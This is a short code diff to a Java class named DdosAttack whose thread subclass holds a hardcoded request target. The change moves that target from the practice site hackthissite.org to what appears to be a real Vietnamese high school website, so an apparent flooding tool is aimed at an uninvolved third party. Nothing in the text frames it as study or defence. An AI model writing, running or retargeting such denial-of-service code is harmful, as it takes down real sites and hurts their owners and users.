@@ -19,7 +19,7 @@ public class DdosAttack {
     public static class DdosThread extends Thread {
 
         private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = "https://www.hackthissite.org";
+        private final String request = "https://thpt-tanke-bentre.violet.vn/";
         private final URL url;
 
         String param = null;
